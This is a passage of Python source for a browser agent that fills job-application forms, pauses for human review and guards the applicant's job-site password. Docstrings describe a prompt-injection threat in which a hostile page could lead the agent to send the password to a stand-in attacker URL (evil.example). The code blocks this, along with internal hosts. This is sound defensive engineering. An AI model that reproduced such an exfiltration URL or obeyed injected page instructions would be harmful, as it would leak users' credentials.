"""
Autonomous job-application filling with browser-use (pinned to 0.11.x — see requirements.txt).

Flow: the agent fills the form and STOPS before the final submit → the user reviews it in the
live view (and can take over with clicks / typing) → 'submit' has a short follow-up agent click
the final button, 'done' means the user submitted it themselves, 'skip' abandons it.

browser-use 0.11 is CDP-native (no Playwright, no LangChain): LLMs must be its own
`browser_use` Chat* wrappers, and everything here talks to Chrome through the session's CDP client.
"""
import asyncio
import base64
import json
import logging
import os
import re
import shutil
import tempfile
import threading
import unicodedata
from typing import AsyncGenerator, Awaitable, Callable

from pydantic import BaseModel, Field

from . import azure_config

# browser-use's product telemetry (PostHog) and cloud sync are ON unless these say otherwise: every
# run would send the task prompt (the applicant's personal data), action history, visited URLs and
# final result to browser-use. Set before browser_use is imported or used: ProductTelemetry is a
# process-wide singleton that reads the flag once. This is the only module that imports browser_use.
os.environ.setdefault("ANONYMIZED_TELEMETRY", "false")
os.environ.setdefault("BROWSER_USE_CLOUD_SYNC", "false")

logger = logging.getLogger("windrush.browser_agent")

_BACKEND = os.environ.get("LLM_BACKEND", "ollama").lower()
_OLLAMA_HOST  = os.environ.get("OLLAMA_HOST",  "http://ollama:11434")
_OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "qwen3.5:4b")
# Visible output budget per agent step (the claude backend's max_tokens). A measured step — fill a
# made-up application form, strict JSON-schema output — used 353 tokens at reasoning effort 'low'.
_STEP_OUTPUT_TOKENS = 4096

# Viewport the agent browses at. BrowserView.tsx maps clicks on the live frame onto these
# exact dimensions (BROWSER_W / BROWSER_H) — keep the two in sync.
VIEWPORT = {"width": 1280, "height": 800}

# browser-use defaults to 500 steps; cap the LLM spend per application.
_MAX_FILL_STEPS = 40
_MAX_SUBMIT_STEPS = 4
# The fill agent's final summary, shown to the user during review (bounded: it's LLM output).
_MAX_NOTES_CHARS = 2000
# Shown in place of the job-site password in agent text sent to the client (see _redact).
_REDACTED = "••••••••"

# Navigation the agent's browser must never reach: it runs inside the api container, next to
# the internal services. Raw-IP URLs are blocked separately (BrowserProfile.block_ip_addresses).
# 'http*://' because browser-use patterns without a scheme only match https.
_BLOCK_IP_ADDRESSES = True
_PROHIBITED_HOSTS = [
    f"http*://{h}" for h in (
        "localhost", "*.localhost", "host.docker.internal", "metadata.google.internal",
        # docker-compose service names (see docker-compose.yml)
        "api", "frontend", "nginx", "ollama",
    )
]

# How long the review / takeover phase waits for the user's next command. Must stay under
# nginx's proxy_read_timeout (600s) for /api/apply, which sees no bytes while we wait.
_INPUT_TIMEOUT_S = 300

try:
    from browser_use import Agent, BrowserProfile, BrowserSession
    from browser_use.actor.page import Page as _ActorPage
    from browser_use.agent.views import ActionResult
    from browser_use.dom.views import NodeType
    from browser_use.tools.service import Tools
    from browser_use.utils import match_url_with_domain_pattern

    BROWSER_USE_AVAILABLE = True
except ImportError:
    BROWSER_USE_AVAILABLE = False


# ── Keeping the job-site password out of the logs ───────────────────────────
# browser-use logs action params, results and errors AFTER putting the real value in (e.g. its
# "Final Result:" line). Each run registers its password for as long as it runs; a filter masks every
# registered one in records from these logger trees: browser-use, its event bus and CDP client, ours.
_MASKED_LOGGERS = ("browser_use", "bubus", "cdp_use", "windrush")
_MASK = "<sensitive>"
_secret_refs: dict[str, int] = {}       # password → number of runs using it (two users can share one)
_secret_variants: tuple[str, ...] = ()  # what gets masked; replaced whole, so any thread can read it
_secrets_lock = threading.Lock()


def _set_secret_variants() -> None:
    global _secret_variants
    variants = set()
    for secret in _secret_refs:
        # as written raw, inside a repr() and inside JSON (escaped quotes / backslashes / non-ASCII)
        variants.update({secret, repr(secret)[1:-1], json.dumps(secret)[1:-1]})
    # Longest first, so a secret that contains another one is masked whole.
    _secret_variants = tuple(sorted(variants, key=len, reverse=True))


def _register_secret(secret: str) -> None:
    if secret:
        with _secrets_lock:
            _secret_refs[secret] = _secret_refs.get(secret, 0) + 1
            _set_secret_variants()


def _unregister_secret(secret: str) -> None:
    if secret:
        with _secrets_lock:
            if _secret_refs.get(secret, 0) > 1:
                _secret_refs[secret] -= 1
            else:
                _secret_refs.pop(secret, None)
            _set_secret_variants()


def _mask_secrets(text: str) -> str:
    for secret in _secret_variants:
        text = text.replace(secret, _MASK)
    return text


class _SecretMaskFilter(logging.Filter):
    """Masks every registered password in a record's message (msg % args) and traceback text."""

    _prefixes = tuple(f"{name}." for name in _MASKED_LOGGERS)
    _tb_formatter = logging.Formatter()

    def filter(self, record: logging.LogRecord) -> bool:
        if not _secret_variants or not (record.name in _MASKED_LOGGERS or record.name.startswith(self._prefixes)):
            return True
        try:
            message = record.getMessage()
        except Exception:
            return True  # a malformed record: let logging report it as it normally would
        masked = _mask_secrets(message)
        if masked != message:
            record.msg, record.args = masked, ()
        if record.exc_info:
            # Formatters reuse a cached exc_text, so a masked one is what every handler prints.
            text = record.exc_text or self._tb_formatter.formatException(record.exc_info)
            masked_tb = _mask_secrets(text)
            if masked_tb != text:
                record.exc_text = masked_tb
        if record.stack_info:
            record.stack_info = _mask_secrets(record.stack_info)
        return True


def _install_secret_mask() -> None:
    """
    Apply the filter as each record is created (the log record factory), so it holds whatever
    handlers are attached — browser-use's own console handler, uvicorn's, pytest's — and for child
    loggers too: a filter on a logger never sees records propagated up from its children.
    """
    previous = logging.getLogRecordFactory()
    if getattr(previous, "masks_secrets", False):
        return
    mask = _SecretMaskFilter()

    def factory(*args, **kwargs):
        record = previous(*args, **kwargs)
        mask.filter(record)
        return record

    factory.masks_secrets = True
    logging.setLogRecordFactory(factory)


_install_secret_mask()


def _make_browser_llm():
    """The browser-use chat model for the configured backend (its own wrappers, not LangChain)."""
    if _BACKEND == "groq":
        from browser_use import ChatGroq
        # Same model as the main agent. browser-use drives Groq via json_schema output, so this
        # must be a model listed in browser_use.llm.groq.chat.JsonSchemaModels (llama-4-scout is).
        return ChatGroq(
            model=os.environ.get("GROQ_MODEL", "meta-llama/llama-4-scout-17b-16e-instruct"),
            api_key=os.environ.get("GROQ_API_KEY", ""),
        )
    if _BACKEND == "claude":
        from browser_use import ChatAnthropic
        return ChatAnthropic(
            model=os.environ.get("ANTHROPIC_MODEL", "claude-sonnet-4-6"),
            api_key=os.environ.get("ANTHROPIC_API_KEY", ""),
            max_tokens=_STEP_OUTPUT_TOKENS,
            timeout=120.0,
        )
    if _BACKEND == "azure":
        from browser_use import ChatAzureOpenAI
        cfg = azure_config.load()
        return ChatAzureOpenAI(
            model=cfg.deployment,
            azure_deployment=cfg.deployment,
            azure_endpoint=cfg.endpoint,
            api_key=cfg.api_key,
            api_version=cfg.api_version,
            # Chat Completions (works for this deployment); 'auto' only switches for codex models.
            use_responses_api=False,
            # A reasoning model 400s on any of these, and ChatOpenAI sends temperature=0.2 and
            # frequency_penalty=0.3 by default (it only drops them for model names on its own list).
            temperature=None,
            frequency_penalty=None,
            top_p=None,
            # Listing the deployment as a reasoning model is what makes browser-use send reasoning_effort.
            reasoning_models=[cfg.deployment],
            reasoning_effort=cfg.reasoning_effort,
            # Sent as max_completion_tokens (never max_tokens), which hidden reasoning also counts against.
            max_completion_tokens=_STEP_OUTPUT_TOKENS + cfg.reasoning_headroom,
        )
    from browser_use import ChatOllama
    return ChatOllama(model=_OLLAMA_MODEL, host=_OLLAMA_HOST)


async def _screenshot_b64(browser_session) -> str:
    """JPEG of the agent-focused tab, base64-encoded ('' if the browser isn't available)."""
    try:
        jpeg = await browser_session.take_screenshot(format="jpeg", quality=60)
        return base64.b64encode(jpeg).decode()
    except Exception:
        return ""


def _has_page(browser_session) -> bool:
    return bool(getattr(browser_session, "agent_focus_target_id", None))


def _redact(text: str, secret: str) -> str:
    """`text` with every occurrence of `secret` masked. browser-use swaps <secret>job_password</secret>
    for the real value in everything the agent does — its own `done` text included — so agent text
    goes through here before it reaches the client (and before any truncation, which could cut the
    password in half and leave a prefix showing)."""
    return text.replace(secret, _REDACTED) if secret else text


def _push_frame(frame_queue: asyncio.Queue, frame_b64: str):
    """Drop oldest frame if full, then push newest."""
    if frame_queue.full():
        try:
            frame_queue.get_nowait()
        except asyncio.QueueEmpty:
            pass
    try:
        frame_queue.put_nowait(frame_b64)
    except asyncio.QueueFull:
        pass


async def _cdp_screencaster(browser_session, frame_queue: asyncio.Queue):
    """
    Stream CDP Page.screencast frames from whichever tab currently has agent focus.
    Chrome pushes JPEGs (no screenshot polling); we only poll cached session state to
    notice focus changes and move the screencast to the new tab. Mirrors browser-use's own
    RecordingWatchdog, which is inactive here because we don't enable video recording.
    """
    current: dict = {"session_id": None}
    registered = False
    ack_tasks: set[asyncio.Task] = set()

    async def _ack(frame_session_id: int, session_id: str | None):
        try:
            await browser_session.cdp_client.send.Page.screencastFrameAck(
                params={"sessionId": frame_session_id}, session_id=session_id,
            )
        except Exception:
            pass

    def on_frame(event, session_id):
        # Synchronous: the CDP reader awaits handlers inline, so the ack runs as its own task.
        if session_id == current["session_id"] and event.get("data"):
            _push_frame(frame_queue, event["data"])
        task = asyncio.create_task(_ack(event["sessionId"], session_id))
        ack_tasks.add(task)
        task.add_done_callback(ack_tasks.discard)

    try:
        while True:
            try:
                if _has_page(browser_session):
                    if not registered:
                        browser_session.cdp_client.register.Page.screencastFrame(on_frame)
                        registered = True
                    cdp_session = await browser_session.get_or_create_cdp_session(focus=False)
                    if cdp_session.session_id != current["session_id"]:
                        old = current["session_id"]
                        current["session_id"] = cdp_session.session_id
                        if old:
                            try:
                                await browser_session.cdp_client.send.Page.stopScreencast(session_id=old)
                            except Exception:
                                pass  # the old tab may already be gone
                        await cdp_session.cdp_client.send.Page.startScreencast(
                            params={"format": "jpeg", "quality": 60,
                                    "maxWidth": VIEWPORT["width"], "maxHeight": VIEWPORT["height"],
                                    "everyNthFrame": 1},
                            session_id=cdp_session.session_id,
                        )
            except Exception as exc:
                logger.debug("screencast attach failed: %s", exc)
                current["session_id"] = None  # retry on the next tick
            await asyncio.sleep(0.5)
    finally:
        if current["session_id"]:
            try:
                await browser_session.cdp_client.send.Page.stopScreencast(session_id=current["session_id"])
            except Exception:
                pass


DONE_COMMANDS = {"submit", "done", "skip", "cancel", "abort"}
# Subset of DONE_COMMANDS that mean "the application went in" (vs. abandoned).
SUBMIT_COMMANDS = {"submit", "done"}


async def _focused_page(browser_session):
    """Actor Page for the agent-focused tab, reusing its existing CDP session."""
    cdp_session = await browser_session.get_or_create_cdp_session(focus=False)
    return _ActorPage(browser_session, cdp_session.target_id, session_id=cdp_session.session_id), cdp_session


async def _run_user_command(browser_session, cmd: dict) -> None:
    """Replay one takeover input (from BrowserView.tsx) onto the focused tab via CDP."""
    page, cdp_session = await _focused_page(browser_session)
    kind = cmd.get("type", "")
    if kind == "click":
        tabs_before = len(browser_session.get_page_targets())
        await (await page.mouse).click(int(float(cmd["x"])), int(float(cmd["y"])))
        await asyncio.sleep(0.8)
        # Follow a tab the click opened (e.g. "Apply on company site").
        if len(browser_session.get_page_targets()) > tabs_before:
            new_tab = await browser_session.get_most_recently_opened_target_id()
            await browser_session.get_or_create_cdp_session(new_tab, focus=True)
    elif kind == "type":
        await _insert_text(browser_session, cdp_session, str(cmd.get("text", "")))
    elif kind == "key":
        await page.press(str(cmd.get("key", "Enter")))
        await asyncio.sleep(0.4)
    elif kind == "scroll":
        await (await page.mouse).scroll(delta_y=int(float(cmd.get("delta", 300))))
        await asyncio.sleep(0.3)


async def _insert_text(browser_session, cdp_session, text: str) -> None:
    await browser_session.cdp_client.send.Input.insertText(params={"text": text}, session_id=cdp_session.session_id)
    await asyncio.sleep(0.2)


async def _interactive_session(
    browser_session,
    instruction_queue: asyncio.Queue,
    intro_action: str,
    intro_reason: str,
    on_submit: Callable[[], Awaitable[tuple[bool, str]]],
    notes: str = "",
    questions: list[dict] | None = None,
    on_answers: Callable[[list[dict]], Awaitable[dict]] | None = None,
) -> AsyncGenerator[dict, None]:
    """
    Hand control to the user until they finish. Commands (from BrowserView.tsx):
      JSON {type: click|type|key|scroll} → replayed onto the page via CDP
      'submit' → a short agent clicks the final submit button (submitted if it confirms)
      'done'   → the user submitted it themselves
      'skip' / 'cancel' / 'abort' → abandon (not submitted)
      JSON {type: answers, answers: [{question, answer, kind, options}]} → `on_answers` puts the answers the
        user gave in the review on the form; its result ({action, notes, questions}) is the next event
      any other text → typed into the focused field
    `notes` (the agent's own summary) and `questions` (what answer_questions answered) ride on the first
    event only; the UI keeps them for the review.
    """
    def interactive(action: str, reason: str, screenshot: str) -> dict:
        return {"action": action, "screenshot": screenshot or None, "blocked": True,
                "reason": reason, "done": False, "interactive": True}

    intro = interactive(intro_action, intro_reason, await _screenshot_b64(browser_session))
    if notes:
        intro["notes"] = notes
    if questions:
        intro["questions"] = questions
    yield intro
    again = "Click the screenshot or type below. 'submit' sends it, 'done' if you submitted it yourself, 'skip' cancels."

    while True:
        try:
            raw = await asyncio.wait_for(instruction_queue.get(), timeout=_INPUT_TIMEOUT_S)
        except asyncio.TimeoutError:
            yield {"action": "Session timed out", "screenshot": None, "blocked": False, "reason": None, "done": True}
            return

        cmd: dict | None = None
        try:
            parsed = json.loads(raw)
            if isinstance(parsed, dict) and "type" in parsed:
                cmd = parsed
        except (json.JSONDecodeError, TypeError):
            pass
        word = (cmd.get("type", "") if cmd else str(raw)).strip().lower()

        if word == "answers" and cmd is not None and on_answers is not None:
            answers = _review_answers(cmd.get("answers"))
            if not answers:
                yield interactive("There were no answers to fill in", again, await _screenshot_b64(browser_session))
                continue
            count = f"{len(answers)} answer{'' if len(answers) == 1 else 's'}"
            yield {"action": f"Filling in your {count}…", "screenshot": None, "blocked": False, "reason": None,
                   "done": False}
            update = await on_answers(answers)
            event = interactive(update.get("action", f"Filled in your {count}"), again,
                                await _screenshot_b64(browser_session))
            event.update({k: update[k] for k in ("notes", "questions") if k in update})
            yield event
            continue

        if word == "submit":
            yield {"action": "Submitting the application…", "screenshot": None, "blocked": False,
                   "reason": None, "done": False}
            ok, detail = await on_submit()
            if ok:
                yield {"action": f"Application submitted{': ' + detail if detail else ''}",
                       "screenshot": await _screenshot_b64(browser_session) or None,
                       "blocked": False, "reason": None, "done": True, "submitted": True}
                return
            yield interactive(
                f"Couldn't confirm the submission{': ' + detail if detail else ''}",
                "Click the submit button on the screenshot yourself, then type 'done' — or 'skip' to cancel.",
                await _screenshot_b64(browser_session),
            )
            continue

        if word in DONE_COMMANDS:
            if word in SUBMIT_COMMANDS:
                yield {"action": "Marked as submitted by you", "screenshot": None, "blocked": False,
                       "reason": None, "done": True, "submitted": True}
            else:
                yield {"action": "Cancelled by user", "screenshot": None, "blocked": False, "reason": None, "done": True}
            return

        # What the user types can be a password (e.g. a login the agent handed over): it is never
        # echoed back or logged, only its length.
        what = word if cmd else f"{len(str(raw))} character{'' if len(str(raw)) == 1 else 's'}"
        try:
            if cmd:
                await _run_user_command(browser_session, cmd)
                label = f"Executed: {word}"
            else:
                _, cdp_session = await _focused_page(browser_session)
                await _insert_text(browser_session, cdp_session, str(raw))
                label = f"Typed {what}"
        except Exception as exc:
            logger.warning("takeover input (%s) failed: %s", what, exc)
            label = f"That didn't work ({exc}) — try again"
        yield interactive(label, again, await _screenshot_b64(browser_session))


def _build_task(job_url: str, persona: dict, cover_letter: str,
                job_email: str, job_password: str, cv_path: str, cover_letter_path: str = "") -> str:
    lines = []
    if job_email:
        # The real password is never in the prompt: browser-use substitutes the placeholder at
        # input time (Agent sensitive_data, scoped to the job site — see _credential_scope).
        password_hint = " password=<secret>job_password</secret>" if job_password else ""
        lines.append(f"If asked to log in, use: email={job_email}{password_hint}")
    if cv_path:
        lines.append(f"If asked to upload a CV/resume, upload the file at: {cv_path}")

    core = persona.get("core_info", {})

    profile_lines = []
    full_name = f"{core.get('first_name', '')} {core.get('last_name', '')}".strip()
    if full_name: profile_lines.append(f"Full name: {full_name}")
    if core.get("preferred_name"): profile_lines.append(f"Preferred name: {core['preferred_name']}")
    if core.get("dob"): profile_lines.append(f"Date of Birth: {core['dob']}")
    if core.get("email") or job_email: profile_lines.append(f"Email: {core.get('email') or job_email}")
    if core.get("phone"): profile_lines.append(f"Phone: {core['phone']}")
    
    address = ", ".join(filter(None, [
        core.get("address_line_1"), core.get("city"), core.get("postcode"), core.get("country")
    ]))
    if address: profile_lines.append(f"Address: {address}")
    
    if core.get("linkedin"): profile_lines.append(f"LinkedIn: {core['linkedin']}")
    if core.get("github"): profile_lines.append(f"GitHub: {core['github']}")
    if core.get("twitter"): profile_lines.append(f"Twitter/X: {core['twitter']}")
    if core.get("portfolio"): profile_lines.append(f"Portfolio/Website: {core['portfolio']}")
    # Visas, nationality, clearance and every other screening fact go through answer_questions, so each
    # answer on the form is recorded with where it came from.

    # Certifications
    for cert in persona.get("certifications", []):
        profile_lines.append(
            f"Certification: {cert.get('name', '')} from {cert.get('issuing_organization', '')}. "
            f"Credential ID: {cert.get('credential_id', '')}. URL: {cert.get('credential_url', '')}"
        )

    # Categorized Skills
    skills_lines = []
    for cat in persona.get("skills", []):
        skills_lines.append(f"{cat.get('category', 'Uncategorized')}: {', '.join(cat.get('skills', []))}")
    if skills_lines:
        profile_lines.append("Skills - " + " | ".join(skills_lines))

    # All education entries
    for edu in persona.get("education", []):
        status = "Ongoing" if edu.get("is_currently_enrolled") else edu.get("end_date", "Present")
        profile_lines.append(
            f"Education: {edu.get('degree', '')} at {edu.get('institution', '')} "
            f"({edu.get('start_date', '')} to {status}). Grade: {edu.get('grade', '')}"
        )
    # Experience
    for exp in persona.get("history", [])[:5]:
        status = "Present" if exp.get("is_current") else exp.get("end_date", "")
        profile_lines.append(
            f"Experience: {exp.get('title', '')} at {exp.get('employer', '')} "
            f"({exp.get('start_date', '')} to {status}). "
            f"Achievements: {', '.join(exp.get('achievements', []))}. Metrics: {exp.get('metrics', '')}"
        )
    
    # Projects
    for proj in persona.get("projects", []):
        status = "Ongoing" if proj.get("is_ongoing") else "Completed"
        profile_lines.append(
            f"Project: {proj.get('name', '')} ({status}). Problem: {proj.get('problem_solved', '')}. "
            f"Outcomes: {proj.get('outcomes', '')}. URL: {proj.get('url', '')}"
        )

    creds_block = "\n".join(lines)
    profile_block = "\n".join(profile_lines)
    task = f"Apply for the job at: {job_url}"
    if creds_block:
        task += f"\n\n{creds_block}"
    if profile_block:
        task += f"\n\nApplicant details:\n{profile_block}"

    task += (
        "\n\nQuestions: the details above are for the form's name, contact, education and employment fields. For "
        "every other question (right to work, visas and sponsorship, nationality, notice period, salary, "
        "availability, preferences, equality monitoring, consent and declarations, and any question that asks "
        "for a written answer) call answer_questions first, with all of the page's questions in one call: each "
        "label exactly as the form shows it, with its options for a dropdown, radio or checkbox question. Then "
        "fill in exactly what it returns. Never answer one of these questions yourself, and leave blank every "
        "question it says to leave blank: those are facts only the candidate can give. Do NOT guess."
    )

    if persona.get("custom_directives"):
        task += f"\n\nCustom Directives to follow: {persona['custom_directives']}"

    if cover_letter_path:
        task += (f"\n\nCover letter: if the form takes it as a file (an upload / attach option), upload the file at: "
                 f"{cover_letter_path}")
    if cover_letter.strip():
        # The model never re-types the letter: paste_cover_letter puts the exact text in, in one step.
        task += ("\n\nIf the form only has a text box for the cover letter (open any 'Enter manually' option first), "
                 "fill it with the paste_cover_letter action, giving the box's index. Never type the letter yourself.")
    task += (
        "\n\nFill in the application completely: every required field, plus optional ones you have an answer for "
        "(leave optional fields blank if you don't). Logging in, creating an account, uploading the CV and moving "
        "between steps of a multi-page form with 'Next'/'Continue' are all fine."
        "\n\nIMPORTANT — DO NOT SUBMIT. Never click the FINAL button that sends the application "
        "(e.g. 'Submit', 'Submit application', 'Apply', 'Send application', 'Finish'). The candidate reviews the "
        "filled form and submits it themselves. As soon as the only thing left is that final submission, stop and "
        "call done with success=true. In the done text, start with 'Needs your input: ...' (one question per line) "
        "if you left any question unanswered, then summarise what you filled and anything you were unsure about. "
        "If you cannot fill the form (blocked, missing information, page errors), call done with success=false and "
        "say why, again starting with 'Needs your input: ...' for anything the candidate must answer."
    )
    return task


_SUBMIT_TASK = (
    "The job application form on the current page has already been filled in and the candidate has reviewed "
    "and approved it. Click the button that submits the application (e.g. 'Submit', 'Submit application', "
    "'Apply', 'Send'). Do NOT change any field and do NOT navigate elsewhere. After clicking, check the page: "
    "call done with success=true only if it confirms the application was received/submitted; otherwise call done "
    "with success=false and quote any error or validation message shown."
)


def _browser_profile() -> "BrowserProfile":
    return BrowserProfile(
        headless=True,
        keep_alive=True,  # keep the browser after agent.run() for review / takeover / submit
        viewport=VIEWPORT,
        device_scale_factor=1,
        block_ip_addresses=_BLOCK_IP_ADDRESSES,
        prohibited_domains=_PROHIBITED_HOSTS,
        enable_default_extensions=False,
        args=[
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled",
            "--disable-extensions",
            # Hardware / performance
            "--disable-gpu",
            "--js-flags=--max-old-space-size=512",
        ],
    )


def _credential_scope(job_url: str) -> str | None:
    """
    browser-use domain pattern the job-site password may be typed into: the job URL's host and
    its subdomains, HTTPS only. A login on a different domain (e.g. an external ATS) won't get
    the secret — the agent hands over and the user types it — which is the point: a
    prompt-injected page elsewhere can't get it typed into an attacker's form.
    """
    from urllib.parse import urlparse
    host = (urlparse(job_url).hostname or "").lower()
    host = host.removeprefix("www.")
    return f"https://*.{host}" if host else None


def _secret_keys(sensitive_data: dict) -> set[str]:
    keys: set[str] = set()
    for key, value in sensitive_data.items():
        if isinstance(value, dict):   # {domain pattern: {key: value}}
            keys.update(value)
        else:                         # legacy {key: value}
            keys.add(key)
    return keys


def _carries_secret(value, keys: set[str]) -> bool:
    """Whether (possibly nested) action params hold anything browser-use would swap for a secret."""
    if isinstance(value, str):
        # browser-use replaces <secret>key</secret> anywhere in a string, and a string that IS a key
        return "<secret>" in value or value in keys
    if isinstance(value, dict):
        return any(_carries_secret(v, keys) for v in value.values())
    if isinstance(value, (list, tuple)):
        return any(_carries_secret(v, keys) for v in value)
    return False


async def _element_document_url(browser_session, node) -> str:
    """URL of the document an element lives in: its iframe's when it's inside one, else the tab's."""
    parent = node.parent_node
    while parent is not None and parent.node_type != NodeType.DOCUMENT_NODE:
        parent = parent.parent_node
    if parent is None:
        return ""  # no owning document in the tree: treat as unknown
    frame_owner = parent.parent_node  # the <iframe> element whose document this is; None for the tab's
    if frame_owner is None:
        return browser_session.session_manager.get_target(node.target_id).url
    # In-process iframes (all of them in Docker, where browser-use turns site isolation off) share the
    # tab's target, so ask the frame tree — what browser-use itself uses to find an iframe's target.
    frames, _ = await browser_session.get_all_frames()
    return (frames.get(frame_owner.frame_id) or {}).get("url", "")


async def _input_target_in_scope(browser_session, index, sensitive_data: dict) -> bool:
    """
    browser-use checks the TAB's URL against the secret's scope, but the field being typed into can
    sit in a cross-origin iframe the job page embeds: check the URL of the field's own document.
    """
    patterns = [pattern for pattern, value in sensitive_data.items() if isinstance(value, dict)]
    try:
        node = await browser_session.get_element_by_index(index)
        if node is None:
            return True  # stale index: browser-use types nothing and tells the agent so
        url = await _element_document_url(browser_session, node)
    except Exception:
        return False
    return any(match_url_with_domain_pattern(url or "", pattern) for pattern in patterns)


def _secret_scoped_tools() -> "Tools":
    """
    Tools for an Agent that holds the job-site password: the password can only be TYPED, into a field
    of the site it's scoped to. browser-use 0.11.13 swaps the placeholder into the params of ANY action
    while the tab is in scope, so a prompt-injected job page could get the agent to navigate to
    https://evil.example/?p=<secret>job_password</secret> (or evaluate / done it). Here every action but
    `input` runs without the secrets, and one that carries a placeholder is refused instead.
    """
    tools = Tools(exclude_actions=["screenshot"])  # what Agent builds itself when use_vision=False
    act = tools.act

    async def guarded_act(action, browser_session, sensitive_data=None, **kwargs):
        if sensitive_data:
            # The same view of the action that Tools.act executes (an ActionModel or its RootModel union).
            calls = {name: params for name, params in action.model_dump(exclude_unset=True).items()
                     if params is not None}
            typing = list(calls) == ["input"]
            keys = _secret_keys(sensitive_data)
            carrying = ", ".join(name for name, params in calls.items() if _carries_secret(params, keys))
            if carrying and not typing:
                error = (f"Refused '{carrying}': a <secret> placeholder can only be typed into a form field "
                         f"with 'input'. Nothing was done.")
            elif carrying and not await _input_target_in_scope(browser_session, calls["input"].get("index"),
                                                               sensitive_data):
                error = ("Refused 'input': that field isn't on the site the password belongs to, so the "
                         "password was not typed. Nothing was done.")
            else:
                error = None
            if error:
                logger.warning("refused browser action %s: it carries the password placeholder", carrying)
                return ActionResult(error=error)
            if not typing:
                sensitive_data = None
        return await act(action, browser_session, sensitive_data=sensitive_data, **kwargs)

    tools.act = guarded_act
    return tools


# Answers the candidate gave in the review, put on the paused form by a short follow-up agent.
_MAX_REVIEW_ANSWERS = 20
_FILL_TASK = (
    "The job application form on the current page has been filled in, and the candidate has now answered some "
    "questions that were left blank (or rewritten an answer). Put each answer below on the form exactly as given: "
    "choose the given option for a dropdown, radio or checkbox question, type the given text into a text box, and "
    "use fill_answer for a written answer. Change nothing else, don't navigate away, and do NOT submit the form "
    "or click any button that sends it. Then call done with success=true, or with success=false naming each "
    "question you couldn't find on the page.\n\n"
)


def _review_answers(raw) -> list[dict]:
    """The answers a review 'answers' command carries, checked: [{question, answer, kind, options}]."""
    out = []
    for item in raw if isinstance(raw, list) else []:
        if not isinstance(item, dict):
            continue
        question = " ".join(str(item.get("question") or "").split())[:500]
        answer = str(item.get("answer") or "").strip()[:5000]
        if not question or not answer:
            continue
        options = [str(o)[:200] for o in item.get("options") or [] if isinstance(o, str)][:300]
        kind = "written" if item.get("kind") == "written" else "fact"
        out.append({"question": question, "answer": answer, "kind": kind, "options": options})
    return out[:_MAX_REVIEW_ANSWERS]


async def _fill_with_agent(llm, browser_session, sensitive_data: dict | None, answers: list[dict],
                           secret: str = "") -> tuple[bool, str]:
    """Run a short follow-up agent on the paused form that puts the review's answers in. Like the submit
    agent it gets the password-scoped tools, plus fill_answer for the written answers."""
    numbered = {n: {**a, "source": "saved"} for n, a in enumerate(answers, 1)}
    task = _FILL_TASK + "Answers:\n" + "\n".join(_answer_line(n, a) for n, a in numbered.items())
    tools = _secret_scoped_tools()
    _add_fill_answer(tools, browser_session, numbered)
    try:
        agent = Agent(task=task, llm=llm, browser_session=browser_session, use_vision=False, use_judge=False,
                      directly_open_url=False, tools=tools, sensitive_data=sensitive_data)
        history = await agent.run(max_steps=min(4 + 2 * len(answers), 16))
        return bool(history.is_successful()), _redact(history.final_result() or "", secret)[:300]
    except Exception as exc:
        error = _redact(str(exc), secret)
        logger.warning("review fill agent failed: %s", error)
        return False, error[:300]


async def _submit_with_agent(llm, browser_session, sensitive_data: dict | None,
                             secret: str = "") -> tuple[bool, str]:
    """Run a tiny follow-up agent on the same (kept-alive) browser to click the final submit.
    `secret` (the job-site password) is masked out of the detail it returns for the client."""
    try:
        agent = Agent(
            task=_SUBMIT_TASK, llm=llm, browser_session=browser_session,
            use_vision=False, use_judge=False, directly_open_url=False,
            # The page can mirror the typed password into the DOM (React controlled inputs keep the
            # value attribute in sync): with sensitive_data browser-use masks it in this agent's prompts.
            tools=_secret_scoped_tools(), sensitive_data=sensitive_data,
        )
        history = await agent.run(max_steps=_MAX_SUBMIT_STEPS)
        return bool(history.is_successful()), _redact(history.final_result() or "", secret)[:200]
    except Exception as exc:
        error = _redact(str(exc), secret)
        logger.warning("submit agent failed: %s", error)
        return False, error[:200]


# ── Documents, the cover-letter box and the empty-field check ───────────────

def _upload_name(persona: dict, kind: str) -> str:
    """'Ada_Lovelace_CV.pdf': the name an employer sees on an uploaded document (stored files are
    named by id). ASCII only, since some applicant-tracking systems mangle anything else."""
    core = persona.get("core_info") or {}
    words: list[str] = []
    for part in (core.get("first_name"), core.get("last_name"), kind):
        plain = unicodedata.normalize("NFKD", str(part or "")).encode("ascii", "ignore").decode()
        words += re.findall(r"[A-Za-z0-9]+", plain)
    return "_".join(words) + ".pdf"


def _named_copy(src: str, folder: str, name: str) -> str:
    if not src or not os.path.isfile(src):
        return ""
    dest = os.path.join(folder, name)
    shutil.copyfile(src, dest)
    return dest


# Focus the element, scroll it into view and select what it holds, so an insert replaces it.
_SELECT_CONTENTS_JS = """function () {
  this.scrollIntoView({block: 'center'});
  this.focus();
  if (typeof this.select === 'function') { this.select(); return; }
  const range = document.createRange();
  range.selectNodeContents(this);
  const selection = window.getSelection();
  selection.removeAllRanges();
  selection.addRange(range);
}"""


async def _paste_text(browser_session, node, text: str) -> str:
    """
    Replace a text box's contents with `text` in one go and return what the box then holds. One CDP
    insertText fires the input events a paste would, so React-controlled boxes take it. browser-use's
    `input` types key by key and needs the model to write the whole letter into the action, which it
    chunks, trims or retypes: a 500-word letter took a live run 20+ steps.
    """
    cdp = await browser_session.cdp_client_for_node(node)
    send, session_id = cdp.cdp_client.send, cdp.session_id
    resolved = await send.DOM.resolveNode(params={"backendNodeId": node.backend_node_id}, session_id=session_id)
    object_id = resolved["object"]["objectId"]
    await send.Runtime.callFunctionOn(
        params={"objectId": object_id, "functionDeclaration": _SELECT_CONTENTS_JS}, session_id=session_id)
    await send.Input.insertText(params={"text": text}, session_id=session_id)
    held = await send.Runtime.callFunctionOn(
        params={"objectId": object_id, "returnByValue": True,
                "functionDeclaration": "function () { return 'value' in this ? this.value : this.innerText; }"},
        session_id=session_id)
    return str((held.get("result") or {}).get("value") or "")


# ── The form's questions ────────────────────────────────────────────────────
# Every screening question goes through answer_questions, which asks the run's answerer (answers.py in
# production: the answer bank, then the persona, then a draft for written ones) and records each answer
# with its source for the review. The fill agent is never given the facts to answer from itself.

Answerer = Callable[[list[dict]], Awaitable[list[dict]]]


class FormQuestion(BaseModel):
    question: str = Field(description="The question's label exactly as the form shows it")
    options: list[str] = Field(default_factory=list,
                               description="Its choices, for a dropdown, radio or checkbox question")
    max_length: int | None = Field(
        default=None, description="The text box's own character limit (its maxlength attribute), if it has one. "
